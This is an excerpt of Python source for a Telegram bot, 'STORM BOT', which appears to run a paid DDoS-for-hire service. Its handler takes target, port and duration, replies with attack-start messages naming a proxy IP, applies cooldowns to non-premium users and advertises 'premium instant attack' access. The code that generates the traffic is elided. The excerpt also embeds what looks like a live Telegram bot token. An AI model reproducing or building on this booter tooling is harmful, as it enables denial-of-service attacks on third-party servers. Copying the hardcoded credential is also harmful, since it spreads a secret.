...
bot = telebot.TeleBot('7492176838:AAFJPMQ4q3duwjGWouCOdXSJD4UCcDgb79c')
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, \n✨✨Premium \nAttack1 𝐒𝐓𝐀𝐑𝐓ING ACTION WITH PROXY.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n🛡 Proxy: http://173.255.232.166\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy STORM BOT @SAYYED_Z"
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown. Please Wait 150 sec Before Running The /attack1 Command Again buy premium instant attack with zero sec dm @SAYYED_Z."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            response = "Usage :- /attack <target> <port> <time>\nBy STORM BOT @SAYYED_Z "  # Updated command syntax
    else:
